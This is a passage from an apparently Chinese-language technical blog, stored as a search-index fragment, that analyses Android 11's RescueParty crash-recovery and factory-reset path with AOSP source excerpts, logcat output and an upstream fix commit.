RescueParty:   at android.os.HandlerThread.run(HandlerThread.java:67)\n11-08 08:55:37.177  1153  1403 E PackageWatchdog: ==&gt; onPackageFailureLocked : registeredObserver.mayObservePackage(packageName) = false\n\n</code></pre> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/PackageWatchdog.java</p> <pre><code>\n551      /** Register instances of this interface to receive notifications on package failure. */\n552      public interface PackageHealthObserver {\n\n1026      /**\n1027       * Represents an observer monitoring a set of packages along with the failure thresholds for\n1028       * each package.\n1029       *\n1030       * &lt;p&gt; Note, the PackageWatchdog#mLock must always be held when reading or writing\n1031       * instances of this class.\n1032       */\n1033      private static class ObserverInternal {\n1034          public final String name;\n...\n1110          /**\n1111           * Increments failure counts of {@code packageName}.\n1112           * @returns {@code true} if failure threshold is exceeded, {@code false} otherwise\n1113           */\n1114          @GuardedBy(\"mLock\")\n1115          public boolean onPackageFailureLocked(String packageName) {\n1116              if (packages.get(packageName) == null &amp;&amp; registeredObserver.isPersistent()\n1117                      &amp;&amp; registeredObserver.mayObservePackage(packageName)) {\n1118                  packages.put(packageName, sPackageWatchdog.newMonitoredPackage(\n1119                          packageName, DEFAULT_OBSERVING_DURATION_MS, false));\n1120              }\n1121              MonitoredPackage p = packages.get(packageName);\n1122              if (p != null) {\n1123                  return p.onFailureLocked();\n1124              }\n1125              return false;\n1126          }\n\n94      public static final int FAILURE_REASON_UNKNOWN = 0;\n95      public static final int FAILURE_REASON_NATIVE_CRASH = 1;\n96      public static final int FAILURE_REASON_EXPLICIT_HEALTH_CHECK = 2;\n97      public static final int FAILURE_REASON_APP_CRASH = 3;\n98      public static final int FAILURE_REASON_APP_NOT_RESPONDING = 4;\n</code></pre> <pre><code>389      public static class RescuePartyObserver implements PackageHealthObserver {\n\n419          @Override\n420          public int onHealthCheckFailed(@Nullable VersionedPackage failedPackage,\n421                  @FailureReasons int failureReason) {\n422              if (!isDisabled() &amp;&amp; (failureReason == PackageWatchdog.FAILURE_REASON_APP_CRASH\n423                      || failureReason == PackageWatchdog.FAILURE_REASON_APP_NOT_RESPONDING)) {\n424                  return mapRescueLevelToUserImpact(getNextRescueLevel());\n425              } else {\n426                  return PackageHealthObserverImpact.USER_IMPACT_NONE;\n427              }\n428          }\n\n448          @Override\n449          public boolean isPersistent() {\n450              return true;\n451          }\n452  \n453          @Override\n454          public boolean mayObservePackage(String packageName) {\n455              PackageManager pm = mContext.getPackageManager();\n456              try {\n457                  // A package is a module if this is non-null\n458                  if (pm.getModuleInfo(packageName, 0) != null) {\n459                      return true;\n460                  }\n461              } catch (PackageManager.NameNotFoundException ignore) {\n462              }\n463  \n464              try {\n465                  ApplicationInfo info = pm.getApplicationInfo(packageName, 0);\n466                  return (info.flags &amp; PERSISTENT_MASK) == PERSISTENT_MASK;\n467              } catch (PackageManager.NameNotFoundException e) {\n468                  return false;\n469              }\n470          }\n</code></pre> <p>\u627e\u5230Android11\u4e0a\u7684diff : https://github.com/aosp-mirror/platform_frameworks_base/commit/f2abc4e6fa6ed79462e0ddfc6ede526edc646378, \u6ce8\u91ca\u5185\u5bb9:</p> <pre><code>Fix Rescue Party observability criteria\nThe previous behavior erroneously returned if the package\nwas not found by PackageManager#getModuleInfo, which means\nthe persistent process check would never be performed. This\ncaused packages like com.android.systemui to not be handled\nby Rescue Party's mitigation logic. Instead, ensure that\nboth cases are checked.\n\nTest: setprop persist.sys.enable_rescue true,\n      adb shell setprop debug.crash_sysui 1,\n      adb shell kill `pidof com.android.systemui`,\n      ensure recovery mode is reached\nBug: 169284310\nChange-Id: Ifec19b8daba1dacc7f5efcfa47ed3c3a046612e3\n</code></pre> <p>\u4fee\u590d\u540e, \u62d4\u6389<code>USB</code>\u8c03\u8bd5\u7ebf, \u6210\u529f\u8fdb\u5165Recovery\u6a21\u5f0f:</p>"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#3-rescueparty","title":"3 <code>RescueParty</code>\u6267\u884c\u91cd\u7f6e\u7684\u6761\u4ef6","text":"<p>\u6d4b\u8bd5\u60c5\u51b5\u624b\u52a8\u8bbe\u7f6e\u5c5e\u6027<code>persist.sys.enable_rescue</code>\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f;  \u7cfb\u7edf\u56de\u6eda\u540e, \u901a\u8fc7\u8bbe\u7f6e\u5c5e\u6027<code>persist.device_config.configuration.disable_rescue_party</code>, \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f;  \u5de5\u7a0b\u7248\u672c, \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f;  <code>userdebug</code>\u7248\u672c\u4e14<code>adb</code>\u53ef\u7528, \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f; \u5f53<code>persist.sys.disable_rescue</code>\u88ab\u8bbe\u7f6e\u4e3a<code>true</code>, \u4e0d\u8fdb\u5165\u6551\u63f4\u6a21\u5f0f;  \u5426\u5219\u70ed\u91cd\u542f\u540e\u5c31\u4f1a\u6267\u884c\u91cd\u7f6e\u64cd\u4f5c.</p> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/RescueParty.java</p> <pre><code>75      @VisibleForTesting\n76      static final String PROP_ENABLE_RESCUE = \"persist.sys.enable_rescue\";\n\n99      private static final String PROP_DISABLE_RESCUE = \"persist.sys.disable_rescue\";\n101      private static final String PROP_DEVICE_CONFIG_DISABLE_FLAG =\n102              \"persist.device_config.configuration.disable_rescue_party\";\n\n113      private static boolean isDisabled() {\n114          // Check if we're explicitly enabled for testing\n115          if (SystemProperties.getBoolean(PROP_ENABLE_RESCUE, false)) {\n116              return false;\n117          }\n118  \n119          // We're disabled if the DeviceConfig disable flag is set to true.\n120          // This is in case that an emergency rollback of the feature is needed.\n121          if (SystemProperties.getBoolean(PROP_DEVICE_CONFIG_DISABLE_FLAG, false)) {\n122              Slog.v(TAG, \"Disabled because of DeviceConfig flag\");\n123              return true;\n124          }\n125  \n126          // We're disabled on all engineering devices\n127          if (Build.IS_ENG) {\n128              Slog.v(TAG, \"Disabled because of eng build\");\n129              return true;\n130          }\n131  \n132          // We're disabled on userdebug devices connected over USB, since that's\n133          // a decent signal that someone is actively trying to debug the device,\n134          // or that it's in a lab environment.\n135          if (Build.IS_USERDEBUG &amp;&amp; isUsbActive()) {\n136              Slog.v(TAG, \"Disabled because of active USB connection\");\n137              return true;\n138          }\n139  \n140          // One last-ditch check\n141          if (SystemProperties.getBoolean(PROP_DISABLE_RESCUE, false)) {\n142              Slog.v(TAG, \"Disabled because of manual property\");\n143              return true;\n144          }\n145  \n146          return false;\n147      }\n\n389      public static class RescuePartyObserver implements PackageHealthObserver {\n...\n430          @Override\n431          public boolean execute(@Nullable VersionedPackage failedPackage,\n432                  @FailureReasons int failureReason) {\n433              if (isDisabled()) {\n434                  return false;\n435              }\n436              if (failureReason == PackageWatchdog.FAILURE_REASON_APP_CRASH\n437                      || failureReason == PackageWatchdog.FAILURE_REASON_APP_NOT_RESPONDING) {\n438                  int triggerUid = getPackageUid(mContext, failedPackage.getPackageName());\n439                  incrementRescueLevel(triggerUid);\n440                  executeRescueLevel(mContext,\n441                          failedPackage == null ? null : failedPackage.getPackageName());\n442                  return true;\n443              } else {\n444                  return false;\n445              }\n446          }\n\n472          @Override\n473          public int onBootLoop() {\n474              if (isDisabled()) {\n475                  return PackageHealthObserverImpact.USER_IMPACT_NONE;\n476              }\n477              return mapRescueLevelToUserImpact(getNextRescueLevel());\n478          }\n479  \n480          @Override\n481          public boolean executeBootLoopMitigation() {\n482              if (isDisabled()) {\n483                  return false;\n484              }\n485              incrementRescueLevel(Process.ROOT_UID);\n486              executeRescueLevel(mContext, /*failedPackage=*/ null);\n487              return true;\n488          }\n\n\n540      /**\n541       * Hacky test to check if the device has an active USB connection, which is\n542       * a good proxy for someone doing local development work.\n543       */\n544      private static boolean isUsbActive() {\n545          if (SystemProperties.getBoolean(PROP_VIRTUAL_DEVICE, false)) {\n546              Slog.v(TAG, \"Assuming virtual device is connected over USB\");\n547              return true;\n548          }\n549          try {\n550              final String state = FileUtils\n551                      .readTextFile(new File(\"/sys/class/android_usb/android0/state\"), 128, \"\");\n552              return \"CONFIGURED\".equals(state.trim());\n553          } catch (Throwable t) {\n554              Slog.w(TAG, \"Failed to determine if device was on USB\", t);\n555              return false;\n556          }\n557      }\n</code></pre>"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#4-rescueparty","title":"4 <code>RescueParty</code>\u6267\u884c\u91cd\u7f6e","text":"<p><code>executeRescueLevel</code>\u65f6, <code>RescueParty</code>\u6309<code>sys.rescue_level</code>\u8bbe\u7f6e\u7684<code>level</code>\u987a\u5e8f\u9010\u6e10\u52a0\u5f3a: - LEVEL_NONE : \u672a\u8bbe\u7f6e\u6216\u8bbe\u7f6e\u4e3a0, \u76f4\u63a5\u8fd4\u56de - LEVEL_RESET_SETTINGS_UNTRUSTED_DEFAULTS : \u91cd\u7f6eSetting\u914d\u7f6e,  - LEVEL_RESET_SETTINGS_UNTRUSTED_CHANGES : \u91cd\u7f6eSetting\u914d\u7f6e,  - LEVEL_RESET_SETTINGS_TRUSTED_DEFAULTS : \u91cd\u7f6eSetting\u914d\u7f6e,  - LEVEL_FACTORY_RESET : \u6062\u590d\u51fa\u5382\u8bbe\u7f6e\u5e76\u6e05\u9664\u7528\u6237\u6570\u636e</p> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/RescueParty.java</p> <pre><code>224      /**\n225       * Get the next rescue level. This indicates the next level of mitigation that may be taken.\n226       */\n227      private static int getNextRescueLevel() {\n228          return MathUtils.constrain(SystemProperties.getInt(PROP_RESCUE_LEVEL, LEVEL_NONE) + 1,\n229                  LEVEL_NONE, LEVEL_FACTORY_RESET);\n230      }\n231  \n232      /**\n233       * Escalate to the next rescue level. After incrementing the level you'll\n234       * probably want to call {@link #executeRescueLevel(Context, String)}.\n235       */\n236      private static void incrementRescueLevel(int triggerUid) {\n237          final int level = getNextRescueLevel();\n238          SystemProperties.set(PROP_RESCUE_LEVEL, Integer.toString(level));\n239  \n240          EventLogTags.writeRescueLevel(level, triggerUid);\n241          logCriticalInfo(Log.WARN, \"Incremented rescue level to \"\n242                  + levelToString(level) + \" triggered by UID \" + triggerUid);\n243      }\n</code></pre> <pre><code>75      @VisibleForTesting\n76      static final String PROP_ENABLE_RESCUE = \"persist.sys.enable_rescue\";\n77      @VisibleForTesting\n78      static final String PROP_RESCUE_LEVEL = \"sys.rescue_level\";\n79      @VisibleForTesting\n80      static final int LEVEL_NONE = 0;\n81      @VisibleForTesting\n82      static final int LEVEL_RESET_SETTINGS_UNTRUSTED_DEFAULTS = 1;\n83      @VisibleForTesting\n84      static final int LEVEL_RESET_SETTINGS_UNTRUSTED_CHANGES = 2;\n85      @VisibleForTesting\n86      static final int LEVEL_RESET_SETTINGS_TRUSTED_DEFAULTS = 3;\n87      @VisibleForTesting\n88      static final int LEVEL_FACTORY_RESET = 4;\n\n245      private static void executeRescueLevel(Context context, @Nullable String failedPackage) {\n246          final int level = SystemProperties.getInt(PROP_RESCUE_LEVEL, LEVEL_NONE);\n247          if (level == LEVEL_NONE) return;\n248  \n249          Slog.w(TAG, \"Attempting rescue level \" + levelToString(level));\n250          try {\n251              executeRescueLevelInternal(context, level, failedPackage);\n252              EventLogTags.writeRescueSuccess(level);\n253              logCriticalInfo(Log.DEBUG,\n254                      \"Finished rescue level \" + levelToString(level));\n255          } catch (Throwable t) {\n256              logRescueException(level, t);\n257          }\n258      }\n\n260      private static void executeRescueLevelInternal(Context context, int level, @Nullable\n261              String failedPackage) throws Exception {\n262          FrameworkStatsLog.write(FrameworkStatsLog.RESCUE_PARTY_RESET_REPORTED, level);\n263          switch (level) {\n264              case LEVEL_RESET_SETTINGS_UNTRUSTED_DEFAULTS:\n265                  resetAllSettings(context, Settings.RESET_MODE_UNTRUSTED_DEFAULTS, failedPackage);\n266                  break;\n267              case LEVEL_RESET_SETTINGS_UNTRUSTED_CHANGES:\n268                  resetAllSettings(context, Settings.RESET_MODE_UNTRUSTED_CHANGES, failedPackage);\n269                  break;\n270              case LEVEL_RESET_SETTINGS_TRUSTED_DEFAULTS:\n271                  resetAllSettings(context, Settings.RESET_MODE_TRUSTED_DEFAULTS, failedPackage);\n272                  break;\n273              case LEVEL_FACTORY_RESET:\n274                  // Request the reboot from a separate thread to avoid deadlock on PackageWatchdog\n275                  // when device shutting down.\n276                  Runnable runnable = new Runnable() {\n277                      @Override\n278                      public void run() {\n279                          try {\n280                              RecoverySystem.rebootPromptAndWipeUserData(context, TAG);\n281                          } catch (Throwable t) {\n282                              logRescueException(level, t);\n283                          }\n284                      }\n285                  };\n286                  Thread thread = new Thread(runnable);\n287                  thread.start();\n288                  break;\n289          }\n290      }\n\n321      private static void resetAllSettings(Context context, int mode, @Nullable String failedPackage)\n322              throws Exception {\n323          // Try our best to reset all settings possible, and once finished\n324          // rethrow any exception that we encountered\n325          Exception res = null;\n326          final ContentResolver resolver = context.getContentResolver();\n327          try {\n328              resetDeviceConfig(context, mode, failedPackage);\n329          } catch (Exception e) {\n330              res = new RuntimeException(\"Failed to reset config settings\", e);\n331          }\n332          try {\n333              Settings.Global.resetToDefaultsAsUser(resolver, null, mode, UserHandle.USER_SYSTEM);\n334          } catch (Exception e) {\n335              res = new RuntimeException(\"Failed to reset global settings\", e);\n336          }\n337          for (int userId : getAllUserIds()) {\n338              try {\n339                  Settings.Secure.resetToDefaultsAsUser(resolver, null, mode, userId);\n340              } catch (Exception e) {\n341                  res = new RuntimeException(\"Failed to reset secure settings for \" + userId, e);\n342              }\n343          }\n344          if (res != null) {\n345              throw res;\n346          }\n347      }\n</code></pre> <pre><code>log/tar_logcat.02/logcat.log_1.42:11-03 05:05:34.228   879   909 W PackageManager: Incremented rescue level to RESET_SETTINGS_UNTRUSTED_DEFAULTS triggered by UID 1000\nlog/tar_logcat.02/logcat.log_1.42:11-03 05:05:35.859   879   909 W PackageManager: Incremented rescue level to RESET_SETTINGS_UNTRUSTED_CHANGES triggered by UID 1000\nlog/tar_logcat.02/logcat.log_1.42:11-03 05:05:37.289   879   909 W PackageManager: Incremented rescue level to RESET_SETTINGS_TRUSTED_DEFAULTS triggered by UID 1000\nlog/tar_logcat.02/logcat.log_1.42:11-03 05:05:40.503   879   909 W PackageManager: Incremented rescue level to FACTORY_RESET triggered by UID 1000\n</code></pre>"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#5","title":"5 \u6062\u590d\u51fa\u5382","text":"<p>\u6062\u5382\u4f20\u7ed9\u53c2\u6570reason\u7684\u503c\u662fTAG (RescueParty),</p> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/core/java/android/os/RecoverySystem.java</p> <pre><code>\n107      /** Used to communicate with recovery.  See bootable/recovery/recovery.cpp. */\n108      private static final File RECOVERY_DIR = new File(\"/cache/recovery\");\n109      private static final File LOG_FILE = new File(RECOVERY_DIR, \"log\");\n\n1162      /**\n1163       * Called after booting to process and remove recovery-related files.\n1164       * @return the log file from recovery, or null if none was found.\n1165       *\n1166       * @hide\n1167       */\n1168      public static String handleAftermath(Context context) {\n1169          // Record the tail of the LOG_FILE\n1170          String log = null;\n1171          try {\n1172              log = FileUtils.readTextFile(LOG_FILE, -LOG_FILE_MAX_LENGTH, \"...\\n\");\n1173          } catch (FileNotFoundException e) {\n1174              Log.i(TAG, \"No recovery log file\");\n1175          } catch (IOException e) {\n1176              Log.e(TAG, \"Error reading recovery log\", e);\n1177          }\n\n1050      /** {@hide} */\n1051      public static void rebootPromptAndWipeUserData(Context context, String reason)\n1052              throws IOException {\n1053          boolean checkpointing = false;\n1054          boolean needReboot = false;\n1055          IVold vold = null;\n1056          try {\n1057              vold = IVold.Stub.asInterface(ServiceManager.checkService(\"vold\"));\n1058              if (vold != null) {\n1059                  checkpointing = vold.needsCheckpoint();\n1060              } else  {\n1061                  Log.w(TAG, \"Failed to get vold\");\n1062              }\n1063          } catch (Exception e) {\n1064              Log.w(TAG, \"Failed to check for checkpointing\");\n1065          }\n1066  \n1067          // If we are running in checkpointing mode, we should not prompt a wipe.\n1068          // Checkpointing may save us. If it doesn't, we will wind up here again.\n1069          if (checkpointing) {\n1070              try {\n1071                  vold.abortChanges(\"rescueparty\", false);\n1072                  Log.i(TAG, \"Rescue Party requested wipe. Aborting update\");\n1073              } catch (Exception e) {\n1074                  Log.i(TAG, \"Rescue Party requested wipe. Rebooting instead.\");\n1075                  PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);\n1076                  pm.reboot(\"rescueparty\");\n1077              }\n1078              return;\n1079          }\n1080  \n1081          String reasonArg = null;\n1082          if (!TextUtils.isEmpty(reason)) {\n1083              reasonArg = \"--reason=\" + sanitizeArg(reason);\n1084          }\n1085  \n1086          final String localeArg = \"--locale=\" + Locale.getDefault().toString();\n1087          bootCommand(context, null, \"--prompt_and_wipe_data\", reasonArg, localeArg);\n1088      }\n\n\n1138      /**\n1139       * Reboot into the recovery system with the supplied argument.\n1140       * @param args to pass to the recovery utility.\n1141       * @throws IOException if something goes wrong.\n1142       */\n1143      private static void bootCommand(Context context, String... args) throws IOException {\n1144          LOG_FILE.delete();\n1145  \n1146          StringBuilder command = new StringBuilder();\n1147          for (String arg : args) {\n1148              if (!TextUtils.isEmpty(arg)) {\n1149                  command.append(arg);\n1150                  command.append(\"\\n\");\n1151              }\n1152          }\n1153  \n1154          // Write the command into BCB (bootloader control block) and boot from\n1155          // there. Will not return unless failed.\n1156          RecoverySystem rs = (RecoverySystem) context.getSystemService(Context.RECOVERY_SERVICE);\n1157          rs.rebootRecoveryWithCommand(command.toString());\n1158  \n1159          throw new IOException(\"Reboot failed (no permissions?)\");\n1160      }\n</code></pre> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/recoverysystem/RecoverySystemService.java#276</p> <pre><code>275      @Override // Binder call\n276      public void rebootRecoveryWithCommand(String command) {\n277          if (DEBUG) Slog.d(TAG, \"rebootRecoveryWithCommand: [\" + command + \"]\");\n278          synchronized (sRequestLock) {\n279              if (!setupOrClearBcb(true, command)) {\n280                  return;\n281              }\n282  \n283              // Having set up the BCB, go ahead and reboot.\n284              PowerManager pm = mInjector.getPowerManager();\n285              pm.reboot(PowerManager.REBOOT_RECOVERY);\n286          }\n287      }\n\n</code></pre> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/power/PowerManagerService.java#126</p> <pre><code>5128          /**\n5129           * Reboots the device.\n5130           *\n5131           * @param confirm If true, shows a reboot confirmation dialog.\n5132           * @param reason The reason for the reboot, or null if none.\n5133           * @param wait If true, this call waits for the reboot to complete and does not return.\n5134           */\n5135          @Override // Binder call\n5136          public void reboot(boolean confirm, @Nullable String reason, boolean wait) {\n5137              mContext.enforceCallingOrSelfPermission(android.Manifest.permission.REBOOT, null);\n5138              if (PowerManager.REBOOT_RECOVERY.equals(reason)\n5139                      || PowerManager.REBOOT_RECOVERY_UPDATE.equals(reason)) {\n5140                  mContext.enforceCallingOrSelfPermission(android.Manifest.permission.RECOVERY, null);\n5141              }\n5142  \n5143              final long ident = Binder.clearCallingIdentity();\n5144              try {\n5145                  shutdownOrRebootInternal(HALT_MODE_REBOOT, confirm, reason, wait);\n5146              } finally {\n5147                  Binder.restoreCallingIdentity(ident);\n5148              }\n5149          }\n</code></pre>"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#6","title":"6 \u547d\u4ee4\u4f20\u9012","text":"<p>\u51fd\u6570<code>setupOrClearBcb</code>\u8bbe\u7f6e\u5c5e\u6027<code>ctl.start</code>\u4e3a<code>setup-bcb</code>, \u7136\u540e\u628a\u547d\u4ee4\u53d1\u7ed9<code>UncryptSocket</code></p> <p>http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/recoverysystem/RecoverySystemService.java</p> <pre><code>\n415      private boolean setupOrClearBcb(boolean isSetup, String command) {\n416          mContext.enforceCallingOrSelfPermission(android.Manifest.permission.RECOVERY, null);\n417  \n418          final boolean available = checkAndWaitForUncryptService();\n419          if (!available) {\n420              Slog.e(TAG, \"uncrypt service is unavailable.\");\n421              return false;\n422          }\n423  \n424          if (isSetup) {\n425              mInjector.systemPropertiesSet(\"ctl.start\", \"setup-bcb\");\n426          } else {\n427              mInjector.systemPropertiesSet(\"ctl.start\", \"clear-bcb\");\n428          }\n429  \n430          // Connect to the uncrypt service socket.\n431          UncryptSocket socket = mInjector.connectService();\n432          if (socket == null) {\n433              Slog.e(TAG, \"Failed to connect to uncrypt socket\");\n434              return false;\n435          }\n436  \n437          try {\n438              // Send the BCB commands if it's to setup BCB.\n439              if (isSetup) {\n440                  socket.sendCommand(command);\n441              }\n442  \n443              // Read the status from the socket.\n444              int status = socket.getPercentageUncrypted();\n445  \n446              // Ack receipt of the status code. uncrypt waits for the ack so\n447              // the socket won't be destroyed before we receive the code.\n448              socket.sendAck();\n449  \n450              if (status == 100) {\n451                  Slog.i(TAG, \"uncrypt \" + (isSetup ? \"setup\" : \"clear\")\n452                          + \" bcb successfully finished.\");\n453              } else {\n454                  // Error in /system/bin/uncrypt.\n455                  Slog.e(TAG, \"uncrypt failed with status: \" + status);\n456                  return false;\n457              }\n458          } catch (IOException e) {\n459              Slog.e(TAG, \"IOException when communicating with uncrypt:\", e);\n460              return false;\n461          } finally {\n462              socket.close();\n463          }\n464  \n465          return true;\n466      }\n\n61      // The socket at /dev/socket/uncrypt to communicate with uncrypt.\n62      private static final String UNCRYPT_SOCKET = \"uncrypt\";\n\n468      /**\n469       * Provides a wrapper for the low-level details of framing packets sent to the uncrypt\n470       * socket.\n471       */\n472      public static class UncryptSocket {\n473          private LocalSocket mLocalSocket;\n474          private DataInputStream mInputStream;\n475          private DataOutputStream mOutputStream;\n\n485          public boolean connectService() {\n486              mLocalSocket = new LocalSocket();\n487              boolean done = false;\n488              // The uncrypt socket will be created by init upon receiving the\n489              // service request. It may not be ready by this point. So we will\n490              // keep retrying until success or reaching timeout.\n491              for (int retry = 0; retry &lt; SOCKET_CONNECTION_MAX_RETRY; retry++) {\n492                  try {\n493                      mLocalSocket.connect(new LocalSocketAddress(UNCRYPT_SOCKET,\n494                              LocalSocketAddress.Namespace.RESERVED));\n495                      done = true;\n496                      break;\n\n522          /**\n523           * Sends a command to the uncrypt service.\n524           *\n525           * @param command command to send to the uncrypt service\n526           * @throws IOException if there was an error writing to the socket\n527           */\n528          public void sendCommand(String command) throws IOException {\n529              byte[] cmdUtf8 = command.getBytes(StandardCharsets.UTF_8);\n530              mOutputStream.writeInt(cmdUtf8.length);\n531              mOutputStream.write(cmdUtf8, 0, cmdUtf8.length);\n532          }\n</code></pre> <p><code>main</code>\u51fd\u6570\u80fd\u591f\u770b\u5230<code>uncrypt</code>\u5e94\u7528\u521b\u5efa\u4e86<code>socket</code>, \u7b49\u5f85\u6570\u636e, \u4ecelog\u4e2d\u770b\u5230\u6570\u636e\u683c\u5f0f\u5982\u4e0b:</p> <pre><code>log/log/log/tar_logcat.01/logcat.log.35:11-07 10:58:39.062  7027  7027 I uncrypt :   received command: [--prompt_and_wipe_data\nlog/log/log/tar_logcat.01/logcat.log.35-11-07 10:58:39.062  7027  7027 I uncrypt : --reason=RescueParty\nlog/log/log/tar_logcat.01/logcat.log.35-11-07 10:58:39.062  7027  7027 I uncrypt : --locale=zh_CN\nlog/log/log/tar_logcat.01/logcat.log.35-11-07 10:58:39.062  7027  7027 I uncrypt : ] (59)\n</code></pre> <p>http://www.aospxref.com/android-11.0.0_r21/xref/bootable/recovery/uncrypt/uncrypt.cpp</p> <pre><code>60   *                         b2. create socket at\n61   *                           /dev/socket/uncrypt\n\n135  // UNCRYPT service still needs files on /cache partition (UNCRYPT_PATH_FILE\n136  // and CACHE_BLOCK_MAP). It will be working (and needed) only for non-A/B\n137  // devices, on which /cache partitions always exist.\n138  static const std::string CACHE_BLOCK_MAP = \"/cache/recovery/block.map\";\n139  static const std::string UNCRYPT_PATH_FILE = \"/cache/recovery/uncrypt_file\";\n140  static const std::string UNCRYPT_STATUS = \"/cache/recovery/uncrypt_status\";\n141  static const std::string UNCRYPT_SOCKET = \"uncrypt\";\n\n567  static bool setup_bcb(const int socket) {\n568      // c5. receive message length\n569      int length;\n570      if (!android::base::ReadFully(socket, &amp;length, 4)) {\n571          PLOG(ERROR) &lt;&lt; \"failed to read the length\";\n572          return false;\n573      }\n574      length = ntohl(length);\n575  \n576      // c7. receive message\n577      std::string content;\n578      content.resize(length);\n579      if (!android::base::ReadFully(socket, &amp;content[0], length)) {\n580          PLOG(ERROR) &lt;&lt; \"failed to read the message\";\n581          return false;\n582      }\n583      LOG(INFO) &lt;&lt; \"  received command: [\" &lt;&lt; content &lt;&lt; \"] (\" &lt;&lt; content.size() &lt;&lt; \")\";\n584      std::vector&lt;std::string&gt; options = android::base::Split(content, \"\\n\");\n585      std::string wipe_package;\n586      for (auto&amp; option : options) {\n587          if (android::base::StartsWith(option, \"--wipe_package=\")) {\n588              std::string path = option.substr(strlen(\"--wipe_package=\"));\n589              if (!android::base::ReadFileToString(path, &amp;wipe_package)) {\n590                  PLOG(ERROR) &lt;&lt; \"failed to read \" &lt;&lt; path;\n591                  return false;\n592              }\n593              option = android::base::StringPrintf(\"--wipe_package_size=%zu\", wipe_package.size());\n594          }\n595      }\n596  \n597      // c8. setup the bcb command\n598      std::string err;\n599      if (!write_bootloader_message(options, &amp;err)) {\n600          LOG(ERROR) &lt;&lt; \"failed to set bootloader message: \" &lt;&lt; err;\n601          write_status_to_socket(-1, socket);\n602          return false;\n603      }\n604      if (!wipe_package.empty() &amp;&amp; !write_wipe_package(wipe_package, &amp;err)) {\n605          PLOG(ERROR) &lt;&lt; \"failed to set wipe package: \" &lt;&lt; err;\n606          write_status_to_socket(-1, socket);\n607          return false;\n608      }\n609      // c10. send \"100\" status\n610      write_status_to_socket(100, socket);\n611      return true;\n612  }\n613  \n\n621  int main(int argc, char** argv) {\n622      enum { UNCRYPT, SETUP_BCB, CLEAR_BCB, UNCRYPT_DEBUG } action;\n623      const char* input_path = nullptr;\n624      const char* map_file = CACHE_BLOCK_MAP.c_str();\n625  \n626      if (argc == 2 &amp;&amp; strcmp(argv[1], \"--clear-bcb\") == 0) {\n627          action = CLEAR_BCB;\n628      } else if (argc == 2 &amp;&amp; strcmp(argv[1], \"--setup-bcb\") == 0) {\n629          action = SETUP_BCB;\n630      } else if (argc == 1) {\n631          action = UNCRYPT;\n632      } else if (argc == 3) {\n633          input_path = argv[1];\n634          map_file = argv[2];\n635          action = UNCRYPT_DEBUG;\n636      } else {\n637          usage(argv[0]);\n638          return 2;\n639      }\n...\n    // c3. The socket is created by init when starting the service. uncrypt\n659      // will use the socket to communicate with its caller.\n660      android::base::unique_fd service_socket(android_get_control_socket(UNCRYPT_SOCKET.c_str()));\n661      if (service_socket == -1) {\n662          PLOG(ERROR) &lt;&lt; \"failed to open socket \\\"\" &lt;&lt; UNCRYPT_SOCKET &lt;&lt; \"\\\"\";\n663          log_uncrypt_error_code(kUncryptSocketOpenError);\n664          return 1;\n665      }\n666      fcntl(service_socket, F_SETFD, FD_CLOEXEC);\n667  \n668      if (listen(service_socket, 1) == -1) {\n669          PLOG(ERROR) &lt;&lt; \"failed to listen on socket \" &lt;&lt; service_socket.get();\n670          log_uncrypt_error_code(kUncryptSocketListenError);\n671          return 1;\n672      }\n673  \n674      android::base::unique_fd socket_fd(accept4(service_socket, nullptr, nullptr, SOCK_CLOEXEC));\n675      if (socket_fd == -1) {\n676          PLOG(ERROR) &lt;&lt; \"failed to accept on socket \" &lt;&lt; service_socket.get();\n677          log_uncrypt_error_code(kUncryptSocketAcceptError);\n678          return 1;\n679      }\n680  \n681      bool success = false;\n682      switch (action) {\n683          case UNCRYPT:\n684              success = uncrypt_wrapper(input_path, map_file, socket_fd);\n685              break;\n686          case SETUP_BCB:\n687              success = setup_bcb(socket_fd);\n688              break;\n689          case CLEAR_BCB:\n690              success = clear_bcb(socket_fd);\n691              break;\n692          default:  // Should never happen.\n693              LOG(ERROR) &lt;&lt; \"Invalid uncrypt action code: \" &lt;&lt; action;\n694              return 1;\n695      }\n696  \n</code></pre>"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/#7","title":"7 \u5c5e\u6027\u8bbe\u7f6e/\u53c2\u6570\u4f20\u9012","text":"<p>\u5f00\u53d1\u677f\u4e0a<code>/system/etc/init/bootstat.rc</code>\u5bf9\u5e94\u5982\u4e0b\u6587\u4ef6, </p> <p>Android\u901a\u8fc7\u4e09\u4e2a\u5c5e\u6027\u6765\u786e\u5b9a\u542f\u52a8\u539f\u56e0\u3002 - 